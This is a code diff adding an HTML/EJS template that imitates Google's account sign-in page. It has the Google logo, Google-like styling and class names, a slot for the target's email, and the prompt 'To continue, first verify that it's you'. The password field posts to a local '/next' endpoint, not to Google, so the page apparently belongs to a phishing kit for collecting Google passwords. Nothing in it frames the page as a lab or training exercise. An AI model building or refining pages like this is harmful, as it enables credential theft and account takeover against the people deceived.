@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>Login Form</title>
+    <link rel="stylesheet" href="https://unpkg.com/tailwindcss@2.2.17/dist/tailwind.min.css">
+    <style>
+      /* Additional CSS styles */
+      .form-button {
+        background-color: #4265F4;
+        color: #fff;
+        border: none;
+        padding: 6px 5px;
+        /* increase button padding to make it longer */
+        border-radius: 5px;
+        margin-left: auto;
+        /* align button to right side */
+        cursor: pointer;
+        display: block;
+        /* make button a block element to control width */
+        width: 90px;
+        /* decrease button width */
+        transition: all 0.3s ease-in-out;
+      }
+
+      .form-button:hover {
+        background-color: #2d3748;
+      }
+
+      /* Additional CSS styles for logo */
+      .logo {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin-bottom: 1rem;
+      }
+
+      .logo img {
+        height: 25px;
+        width: 75px;
+        margin-right: 10px;
+      }
+
+      .forgot-link {
+        color: #4265F4;
+        font-size: 16px;
+        align-items: center;
+      }
+
+      .outline {
+        border: 1px solid #dadce0;
+      }
+
+      .form-button {
+        font-family: "Google Sans", Roboto, Arial, sans-serif;
+        font-size: .875rem;
+        letter-spacing: .0107142857em;
+        font-weight: 500;
+        text-transform: none;
+      }
+
+      .email-button {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border: 2px solid #ccc;
+        border-radius: 16px;
+        text-align: center;
+        /* Center align the container */
+        width: 60%;
+        /* Set the container width to 50% */
+        margin: 0 auto;
+        /* Center the container horizontally */
+        font-size: 14px;
+        align-items: center;
+      }
+
+      .email-button:hover {
+        background-color: #f0f0f0;
+      }
+
+      .email-text {
+        margin: 0 10px;
+        text-align: center;
+        font-weight: bold;
+      }
+
+      .email-address {
+        text-align: center;
+      }
+
+      .email-address p {
+        font-size: 14px;
+        /* or any size you prefer */
+      }
+
+      .stUf5b {
+        width: 25px;
+        height: 25px;
+        padding-right: 4px;
+      }
+
+      input[type="checkbox"] {
+        position: absolute;
+        width: 22px;
+        height: 22px;
+      }
+
+      label {
+        padding-left: 28px;
+        margin-right: 10px;
+      }
+    </style>
+  </head>
+  <body class="bg-100">
+    <div class="container mx-auto px-6 md:px-0 mt-10 ">
+      <br>
+      <br>
+      <div class="max-w-md h-90 mx-auto bg-white shadow-lg rounded-lg overflow-hidden outline">
+        <div class="py-4 px-6">
+          <div class="logo">
+            <h2 class="text-2xl text-gray-800 mb-2 block text-center">
+              <br>
+              <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="inline-block h-6 mr-2">
+              <br> Welcome
+            </h2>
+          </div>
+          <div class="email-button">
+            <div class="gPHLDe">
+              <div class="qQWzTd" aria-hidden="true">
+                <svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
+                </svg>
+              </div>
+            </div>
+            <div class="email-address">
+              <p><%= email %> </p>
+            </div>
+            <div class="krLnGe">
+              <svg aria-hidden="true" class="stUf5b MSBt4d" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+                <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
+              </svg>
+            </div>
+          </div>
+          <br>
+          <p class="text-left text-black-700 text-bold mt-2">To continue, first verify that it's you</p>
+          <br>
+          <br>
+          <form action="/next" method="post">
+            <div class="mb-4">
+              <label class="block text-black-700 font-bold mb-2" for="password"></label>
+              <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" name = "password" id="password-input" type="password" placeholder="Enter your password" required>
+            </div>
+            <div>
+              <input class="VfPpkd-muHVFf-bMcfAe" type="checkbox" name="show-password">
+              <label for="show-password"> Show Password </label>
+            </div>
+            <br>
+            <br>
+            <div class="flex items-center justify-between">
+              <a href="#" class="forgot-link ">Forgot password?</a>
+              <button class="form-button " type="submit">Next</button>
+              <br>
+              <br>
+              <br>
+              <br>
+            </div>
+        </div>
+        </form>
+      </div>
+    </div>
+    </div>
+  </body>
+</html>
